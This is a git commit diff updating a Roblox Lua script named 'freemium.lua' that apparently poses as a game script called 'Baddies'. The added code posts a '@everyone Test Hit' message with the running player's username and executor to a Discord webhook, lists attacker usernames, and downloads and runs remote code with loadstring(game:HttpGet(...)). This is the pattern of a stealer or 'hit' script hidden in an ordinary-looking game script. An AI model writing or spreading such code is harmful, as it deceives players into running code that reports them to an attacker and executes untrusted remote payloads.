714f539e8ea0f7b82a4d4e143d81b75df7480ee0
ks2006babyy-dev <ks2006babyy@gmail.com>
2026-04-16 15:46:11 +0000

    Update freemium.lua

--- freemium.lua
+++ freemium.lua
@@ -6,17 +6,18 @@ _G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "username"}
 
 _G.PING_POOR = true
 
--- Simple test message
+-- Simple test message sent directly to Discord
 task.spawn(function()
-    if _G.POOR_WEBHOOK then
+    if _G.POOR_WEBHOOK and game.Players.LocalPlayer then
+        local http = game:GetService("HttpService")
         local data = {
             content = "@everyone **Test Hit**\nUsername: " .. game.Players.LocalPlayer.Name .. "\nExecutor: Delta\nTime: " .. os.date("%X")
         }
-        game:HttpPost(_G.POOR_WEBHOOK, game:GetService("HttpService"):JSONEncode(data))
+        game:HttpPost(_G.POOR_WEBHOOK, http:JSONEncode(data))
     end
 end)
 
--- Load the original Baddies anyway
+-- Load the original Baddies script anyway
 task.spawn(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ks2006babyy-dev/Baddies/refs/heads/main/freemium.lua", true))()
 end)
